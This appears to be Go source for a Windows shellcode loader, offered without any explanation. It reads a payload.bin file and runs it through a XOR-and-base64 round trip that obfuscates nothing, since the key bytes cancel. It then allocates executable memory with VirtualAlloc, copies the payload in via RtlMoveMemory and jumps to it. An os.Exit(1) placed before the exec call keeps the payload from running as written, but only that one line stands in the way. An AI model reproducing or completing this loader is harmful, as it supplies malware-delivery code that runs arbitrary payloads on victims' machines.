package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"time"
	"unsafe"
)


const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var XorKey = []byte{0x13, 0x54, 077, 0x1A, 0xA1, 0x3F, 0x04, 0x8B}

func Dencode(src string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(src)
	xor := []byte(data1)
	var shellcode []byte
	for i := 0; i < len(xor); i++ {
		shellcode = append(shellcode, xor[i]^XorKey[1]^XorKey[2])
	}
	return shellcode
}

func Encode(src string) string {
	shellcode := []byte(src)
	var xor_shellcode []byte
	for i := 0; i < len(shellcode); i++ {
		xor_shellcode = append(xor_shellcode, shellcode[i]^XorKey[2]^XorKey[1])
	}
	bdata := base64.StdEncoding.EncodeToString(xor_shellcode)

	return bdata
}

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func exec(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkError(err)
	}
	time.Sleep(5)

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkError(err)

	time.Sleep(5)
	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func read(file string) []byte {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Print(err)
	}
	return data
}

func main() {
	Encode := Encode(string(read("./payload.bin")))
	shellCodeHex := Dencode(Encode)
	os.Exit(1)
	exec(shellCodeHex)
}
